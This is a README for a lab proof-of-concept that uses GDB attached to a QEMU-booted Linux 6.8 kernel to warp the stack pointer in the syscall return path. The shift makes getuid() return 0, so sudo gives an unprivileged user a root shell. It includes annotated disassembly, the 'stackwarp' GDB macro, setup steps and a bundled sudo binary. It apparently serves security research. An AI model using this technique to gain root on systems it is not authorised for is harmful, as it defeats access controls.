## getuid() sudo Exploit 

Adjust the stack pointer twice to manipulate the return value of getuid(), making sudo think that we are root.

## Environment
* Linux v6.8 (e8f897f4afef0031fe618a8e94127a0934896aba)
* Sudo v1.9.16p2

## How to verify in QEMU with GDB
Setup the VM disk image with `sudo ./setup-vm.sh`. You may have to `chroot` into the image once after it is set up to adjust the root password.
You need to get a `bzImage` of the kernel, preferably by building it yourself with the default configuration (+ debug symbols).
Also you need to generate an initramfs with the kernel modules.
Put both into this directory. You should have `bzImage` and `initrd.img-6.8.0`.
Also, you need an uncompressed kernel with debug symbols (as `vmlinux`) for GDB.

Once all is set up, run `./boot-vm.sh` to direct-boot the kernel and open a GDB interface.
In another terminal, run `gdb -x exploit.gdb vmlinux` and attach to QEMU with `target remote :1234`.

When the machine is booted, log into an unprivileged user account. Then, run in order:
 * `exploit-hook` in GDB
 * `sudo -i` in the VM's shell as an unprivileged user
 * `stackwarp` in GDB after triggering the breakpoint

If all has worked, you should now have a root shell in the VM.

## Vulnerable Code
We manipulate the epilogue of `entry_SYSCALL_64` at `<+224>` :
```
   0xffffffff82000080 <+0>:	endbr64
   0xffffffff82000084 <+4>:	swapgs
   0xffffffff82000087 <+7>:	mov    %rsp,%gs:0x6014
   0xffffffff82000090 <+16>:	jmp    0xffffffff820000a4 <entry_SYSCALL_64+36>
   0xffffffff82000092 <+18>:	mov    %cr3,%rsp
   0xffffffff82000095 <+21>:	nopl   0x0(%rax,%rax,1)
   0xffffffff8200009a <+26>:	and    $0xffffffffffffe7ff,%rsp
   0xffffffff820000a1 <+33>:	mov    %rsp,%cr3
   0xffffffff820000a4 <+36>:	mov    %gs:0x2b2d8,%rsp
   0xffffffff820000ad <+45>:	push   $0x2b
   0xffffffff820000af <+47>:	push   %gs:0x6014
   0xffffffff820000b7 <+55>:	push   %r11
   0xffffffff820000b9 <+57>:	push   $0x33
   0xffffffff820000bb <+59>:	push   %rcx
   0xffffffff820000bc <+60>:	push   %rax
   0xffffffff820000bd <+61>:	push   %rdi
   0xffffffff820000be <+62>:	push   %rsi
   0xffffffff820000bf <+63>:	push   %rdx
   0xffffffff820000c0 <+64>:	push   %rcx
   0xffffffff820000c1 <+65>:	push   $0xffffffffffffffda
   0xffffffff820000c3 <+67>:	push   %r8
   0xffffffff820000c5 <+69>:	push   %r9
   0xffffffff820000c7 <+71>:	push   %r10
   0xffffffff820000c9 <+73>:	push   %r11
   0xffffffff820000cb <+75>:	push   %rbx
   0xffffffff820000cc <+76>:	push   %rbp
   0xffffffff820000cd <+77>:	push   %r12
   0xffffffff820000cf <+79>:	push   %r13
   0xffffffff820000d1 <+81>:	push   %r14
   0xffffffff820000d3 <+83>:	push   %r15
   0xffffffff820000d5 <+85>:	xor    %esi,%esi
   0xffffffff820000d7 <+87>:	xor    %edx,%edx
   0xffffffff820000d9 <+89>:	xor    %ecx,%ecx
   0xffffffff820000db <+91>:	xor    %r8d,%r8d
   0xffffffff820000de <+94>:	xor    %r9d,%r9d
   0xffffffff820000e1 <+97>:	xor    %r10d,%r10d
   0xffffffff820000e4 <+100>:	xor    %r11d,%r11d
   0xffffffff820000e7 <+103>:	xor    %ebx,%ebx
   0xffffffff820000e9 <+105>:	xor    %ebp,%ebp
   0xffffffff820000eb <+107>:	xor    %r12d,%r12d
   0xffffffff820000ee <+110>:	xor    %r13d,%r13d
   0xffffffff820000f1 <+113>:	xor    %r14d,%r14d
   0xffffffff820000f4 <+116>:	xor    %r15d,%r15d
   0xffffffff820000f7 <+119>:	mov    %rsp,%rdi
   0xffffffff820000fa <+122>:	movslq %eax,%rsi
   0xffffffff820000fd <+125>:	jmp    0xffffffff82000115 <entry_SYSCALL_64+149>
   0xffffffff820000ff <+127>:	mov    $0x48,%ecx
   0xffffffff82000104 <+132>:	mov    %gs:0x1ba10,%rdx
   0xffffffff8200010d <+141>:	mov    %edx,%eax
   0xffffffff8200010f <+143>:	shr    $0x20,%rdx
   0xffffffff82000113 <+147>:	wrmsr
   0xffffffff82000115 <+149>:	nop
   0xffffffff82000116 <+150>:	jmp    0xffffffff82000126 <entry_SYSCALL_64+166>
   0xffffffff82000118 <+152>:	int3
   0xffffffff82000119 <+153>:	int3
   0xffffffff8200011a <+154>:	int3
   0xffffffff8200011b <+155>:	int3
   0xffffffff8200011c <+156>:	int3
   0xffffffff8200011d <+157>:	int3
   0xffffffff8200011e <+158>:	int3
   0xffffffff8200011f <+159>:	int3
   0xffffffff82000120 <+160>:	int3
   0xffffffff82000121 <+161>:	int3
   0xffffffff82000122 <+162>:	int3
   0xffffffff82000123 <+163>:	int3
   0xffffffff82000124 <+164>:	int3
   0xffffffff82000125 <+165>:	int3
   0xffffffff82000126 <+166>:	call   0xffffffff81ed6660 <do_syscall_64>
   0xffffffff8200012b <+171>:	test   %al,%al
   0xffffffff8200012d <+173>:	je     0xffffffff82001630 <common_interrupt_return>
   0xffffffff82000133 <+179>:	jmp    0xffffffff8200014e <entry_SYSCALL_64+206>
   0xffffffff82000135 <+181>:	mov    $0x48,%ecx
   0xffffffff8200013a <+186>:	mov    %gs:0x1ba10,%rdx
   0xffffffff82000143 <+195>:	and    $0xfffffffe,%edx
   0xffffffff82000146 <+198>:	mov    %edx,%eax
   0xffffffff82000148 <+200>:	shr    $0x20,%rdx
   0xffffffff8200014c <+204>:	wrmsr
   0xffffffff8200014e <+206>:	pop    %r15
   0xffffffff82000150 <+208>:	pop    %r14
   0xffffffff82000152 <+210>:	pop    %r13
   0xffffffff82000154 <+212>:	pop    %r12
   0xffffffff82000156 <+214>:	pop    %rbp
   0xffffffff82000157 <+215>:	pop    %rbx
   0xffffffff82000158 <+216>:	pop    %r11
   0xffffffff8200015a <+218>:	pop    %r10
   0xffffffff8200015c <+220>:	pop    %r9
   0xffffffff8200015e <+222>:	pop    %r8
=> 0xffffffff82000160 <+224>:	pop    %rax <= HERE. 
   0xffffffff82000161 <+225>:	pop    %rcx
   0xffffffff82000162 <+226>:	pop    %rdx
   0xffffffff82000163 <+227>:	pop    %rsi
   0xffffffff82000164 <+228>:	mov    %rsp,%rdi
   0xffffffff82000167 <+231>:	mov    %gs:0x6004,%rsp
   0xffffffff82000170 <+240>:	push   0x28(%rdi)
   0xffffffff82000173 <+243>:	push   (%rdi)
   0xffffffff82000175 <+245>:	jmp    0xffffffff820001bc <entry_SYSCALL_64+316>
   0xffffffff82000177 <+247>:	push   %rax
   0xffffffff82000178 <+248>:	mov    %cr3,%rdi
   0xffffffff8200017b <+251>:	jmp    0xffffffff820001b1 <entry_SYSCALL_64+305>
   0xffffffff8200017d <+253>:	mov    %rdi,%rax
   0xffffffff82000180 <+256>:	and    $0x7ff,%rdi
   0xffffffff82000187 <+263>:	bt     %rdi,%gs:0x2b396
   0xffffffff82000191 <+273>:	jae    0xffffffff820001a2 <entry_SYSCALL_64+290>
   0xffffffff82000193 <+275>:	btr    %rdi,%gs:0x2b396
   0xffffffff8200019d <+285>:	mov    %rax,%rdi
   0xffffffff820001a0 <+288>:	jmp    0xffffffff820001aa <entry_SYSCALL_64+298>
   0xffffffff820001a2 <+290>:	mov    %rax,%rdi
   0xffffffff820001a5 <+293>:	bts    $0x3f,%rdi
   0xffffffff820001aa <+298>:	or     $0x800,%rdi
   0xffffffff820001b1 <+305>:	or     $0x1000,%rdi
   0xffffffff820001b8 <+312>:	mov    %rdi,%cr3
   0xffffffff820001bb <+315>:	pop    %rax <= not here, this gets skipped due to <+245>
   0xffffffff820001bc <+316>:	pop    %rdi
   0xffffffff820001bd <+317>:	pop    %rsp
   0xffffffff820001be <+318>:	swapgs
   0xffffffff820001c1 <+321>:	nopl   0x0(%rax)
   0xffffffff820001c8 <+328>:	sysretq
   0xffffffff820001cb <+331>:	int3
```

At the marked point, we subtract 8 from the stack pointer, single step by one instruction, and add 8 to the stack pointer again.
Since `%r8` is always 0 when sudo calls `getuid`, this will replace `%rax` with 0, thus setting the return value to 0 and making sudo think that we are already root.

Relevant GDB commands for reference:
```
define stackwarp
    set $rsp = $rsp - 8
    si
    set $rsp = $rsp + 8
end
```

Since the success of this attack heavily relies on the exact `sudo` binary version used, I have included a compressed copy (extract with `zstd -d sudo.zst -o sudo`).
